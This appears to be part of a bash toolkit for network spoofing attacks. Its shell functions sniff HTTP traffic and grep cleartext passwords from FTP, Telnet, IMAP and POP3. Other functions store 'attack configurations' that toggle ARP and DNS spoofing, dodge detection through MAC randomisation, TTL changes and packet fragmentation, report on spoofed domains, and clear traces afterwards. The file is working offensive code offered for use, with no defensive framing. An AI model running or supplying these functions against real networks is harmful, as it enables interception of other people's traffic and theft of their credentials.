# ============================================
# ADVANCED SNIFFING FUNCTIONS
# ============================================

# Sniff HTTP traffic
sniffhttp() {
    local iface=${1:-eth0}
    echo "[*] Sniffing HTTP traffic on $iface (Ctrl+C to stop)..."
    tcpdump -i "$iface" -l -A "tcp port 80" 2>/dev/null | grep -E "GET|POST|Host:"
}

# Sniff HTTPS/SSL
sniffssl() {
    local iface=${1:-eth0}
    echo "[*] Sniffing HTTPS/SSL traffic on $iface (Ctrl+C to stop)..."
    tcpdump -i "$iface" "tcp port 443" -v
}

# Sniff credentials
sniffcreds() {
    local iface=${1:-eth0}
    echo "[*] Sniffing credentials on $iface (Ctrl+C to stop)..."
    tcpdump -i "$iface" -l -A "tcp port 21 or tcp port 23 or tcp port 143 or tcp port 110" 2>/dev/null | \
    grep -E "PASS|USER|Login|Password" --color=never
}

# Sniff all traffic and save
sniffallsave() {
    if [[ $# -lt 2 ]]; then
        echo "Usage: sniffallsave <interface> <pcap_file>"
        echo "Example: sniffallsave eth0 /tmp/capture.pcap"
        return 1
    fi
    
    local iface=$1
    local pcapfile=$2
    
    if [[ $EUID -ne 0 ]]; then
        echo "Must run as root"
        return 1
    fi
    
    echo "[*] Capturing all traffic on $iface to $pcapfile"
    tcpdump -i "$iface" -w "$pcapfile" &
    ALLSNIFFPID=$!
    echo "[+] Packet capture started (PID: $ALLSNIFFPID)"
}

# ============================================
# CONFIGURATION MANAGEMENT
# ============================================

# Save attack configuration
saveconfig() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: saveconfig <config_name>"
        echo "Example: saveconfig my_attack"
        return 1
    fi
    
    local config_name=$1
    local config_dir="/tmp/spoof_configs"
    mkdir -p "$config_dir"
    
    cat > "$config_dir/$config_name.conf" <<EOF
# DNS Spoof Attack Configuration
# Generated: $(date)

TARGET_IP=${TARGET_IP:-}
GATEWAY_IP=${GATEWAY_IP:-}
SPOOF_IP=${SPOOF_IP:-}
DOMAIN=${DOMAIN:-}
INTERFACE=${INTERFACE:-eth0}
DNS_PORT=${DNS_PORT:-53}
HTTP_PORT=${HTTP_PORT:-80}

# Attack modes
ENABLE_ARP_SPOOF=${ENABLE_ARP_SPOOF:-1}
ENABLE_DNS_SPOOF=${ENABLE_DNS_SPOOF:-1}
ENABLE_HTTP_SPOOF=${ENABLE_HTTP_SPOOF:-0}
ENABLE_LOGGING=${ENABLE_LOGGING:-1}
EOF
    
    echo "[+] Configuration saved: $config_dir/$config_name.conf"
}

# Load attack configuration
loadconfig() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: loadconfig <config_name>"
        echo "Example: loadconfig my_attack"
        return 1
    fi
    
    local config_name=$1
    local config_file="/tmp/spoof_configs/$config_name.conf"
    
    if [[ ! -f "$config_file" ]]; then
        echo "Error: Configuration not found"
        return 1
    fi
    
    source "$config_file"
    echo "[+] Configuration loaded: $config_file"
}

# ============================================
# STEALTH & EVASION FUNCTIONS
# ============================================

# Randomize MAC address
randommac() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: randommac <interface>"
        echo "Example: randommac eth0"
        return 1
    fi
    
    local iface=$1
    local newmac=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    
    changemac "$iface" "$newmac"
    echo "[+] Changed to random MAC: $newmac"
}

# TTL manipulation
setttl() {
    if [[ $# -lt 2 ]]; then
        echo "Usage: setttl <interface> <ttl_value>"
        echo "Example: setttl eth0 64"
        return 1
    fi
    
    local iface=$1
    local ttl=$2
    
    if [[ $EUID -ne 0 ]]; then
        echo "Must run as root"
        return 1
    fi
    
    echo "[*] Setting TTL to $ttl for $iface"
    iptables -A OUTPUT -o "$iface" -j TTL --ttl-set "$ttl" 2>/dev/null || \
    echo "TTL module not available"
}

# Fragment packets
fragmentpackets() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: fragmentpackets <interface>"
        echo "Example: fragmentpackets eth0"
        return 1
    fi
    
    local iface=$1
    
    if [[ $EUID -ne 0 ]]; then
        echo "Must run as root"
        return 1
    fi
    
    echo "[*] Enabling packet fragmentation"
    echo 576 > "/proc/sys/net/ipv4/route/min_pmtu" 2>/dev/null
    echo "[+] Fragmentation enabled"
}

# ============================================
# REPORTING & ANALYSIS FUNCTIONS
# ============================================

# Generate traffic report
trafficreport() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: trafficreport <pcap_file> [output_file]"
        echo "Example: trafficreport /tmp/traffic.pcap /tmp/report.txt"
        return 1
    fi
    
    local pcapfile=$1
    local outfile=${2:-/tmp/spoofing_report.txt}
    
    echo "[*] Generating traffic report..."
    
    {
        echo "=== DNS Spoofing Traffic Report ==="
        echo "Generated: $(date)"
        echo ""
        echo "=== Top Domains (Spoofed) ==="
        tshark -r "$pcapfile" -Y "dns" -T fields -e dns.qry.name 2>/dev/null | sort | uniq -c | sort -rn || echo "tshark not available"
        echo ""
        echo "=== Top Source IPs ==="
        tshark -r "$pcapfile" -T fields -e ip.src 2>/dev/null | sort | uniq -c | sort -rn | head -10 || echo "tshark not available"
    } > "$outfile"
    
    echo "[+] Report saved: $outfile"
}

# Analyze captured traffic
analyzetraffic() {
    if [[ $# -lt 1 ]]; then
        echo "Usage: analyzetraffic <pcap_file>"
        echo "Example: analyzetraffic /tmp/traffic.pcap"
        return 1
    fi
    
    local pcapfile=$1
    
    echo "[*] Analyzing captured traffic..."
    echo "[*] Total packets: $(capinfos "$pcapfile" 2>/dev/null | grep 'Number of packets' || echo 'Install capinfos')"
}

# ============================================
# SYSTEM MONITORING FUNCTIONS
# ============================================

# Monitor running attacks
monitorattacks() {
    echo "[*] Active spoofing processes:"
    ps aux | grep -E "arpspoof|dnsmasq|tcpdump|python" | grep -v grep
    echo ""
    echo "[*] Active connections:"
    netstat -plant 2>/dev/null | grep -E "LISTEN|ESTABLISHED" || ss -plant 2>/dev/null
}

# Get system info
sysinfo() {
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "Kernel: $(uname -r)"
    echo "Uptime: $(uptime -p)"
    echo "Load Average: $(cat /proc/loadavg | cut -d' ' -f1-3)"
    echo ""
    echo "=== Network Adapters ==="
    ip link show | grep -E "^[0-9]"
}

# ============================================
# ROLLBACK & RECOVERY FUNCTIONS
# ============================================

# Flush all iptables rules
flushiptables() {
    if [[ $EUID -ne 0 ]]; then
        echo "Must run as root"
        return 1
    fi
    
    echo "[*] Flushing all iptables rules..."
    iptables -F
    iptables -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -t nat -F
    iptables -t mangle -F
    echo "[+] All iptables rules cleared"
}

# Full system recovery
fullrecovery() {
    if [[ $EUID -ne 0 ]]; then
        echo "Must run as root"
        return 1
    fi
    
    echo "[*] === PERFORMING FULL SYSTEM RECOVERY ==="
    cleanupattack
    flushiptables
    disableforward
    killall tcpdump 2>/dev/null
    killall python3 2>/dev/null
    rm -f /tmp/spoof_* /tmp/dnsmasq_* /tmp/dhcp_*
    echo "[+] System recovery complete"
}

